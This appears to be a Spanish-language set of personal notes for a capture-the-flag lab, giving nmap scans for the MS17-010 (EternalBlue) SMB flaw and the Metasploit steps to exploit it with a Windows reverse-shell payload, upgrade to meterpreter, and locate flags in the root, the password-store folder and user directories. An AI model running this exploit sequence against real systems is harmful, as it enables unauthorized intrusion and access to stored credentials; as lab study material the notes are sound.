Parte 1:

nmap 10.10.38.140 --scaneo de la ip

nmap -vv -sV -A -O -sC -p 135,139,445,3389 10.10.38.140 --scaneo de los purtos abiertos y sistema operativo

nmap --script smb-vuln-ms17-010 -p445 10.10.38.140 --scaneo para saber si la maquina es vulnerable a este excploit tras la verison del sistema operativo\\

estos 3 pasos se pueden hacer asi: ```nmap -vv -sV -sC -O -A -p445 -T4 --script vuln <ip>```

Parte 2:

usamos msfconsole

search ms17 --para buscar el exploit en metasplit y poder usarlo

use 0 --es el exploit que necesitamos

show options -- para ver que opciones debemos ajustar como el RHOSTS

set RHOSTS 10.10.38.140 --apra poder atacar a la maquina

set LHOST --tu ip

set LPORT puerto --si no va el predefinido

set payload windows/x64/shell/reverse_tcp --lo dice el ejercicio

run --ejecutamos el exploit

CRTL Z --para hacer backgroubn de la sesion

session -l --para ver las sesiones

session -u <sesion> --para hacerla meterpreter 

Flag1? This flag can be found at the system root. 
  cd .. --hasta llegar a C:\
  type-cat flag1.txt

Flag2? This flag can be found at the location where passwords are stored within Windows.
  Tenemos que entrar a donde se guardan las contarsenyas en windows
  cd C:\Windows\System32\config
  cat flag2.txt

flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. 
  cd Users y ya buscas la carpeta correcta
  cat flag3.txt


  
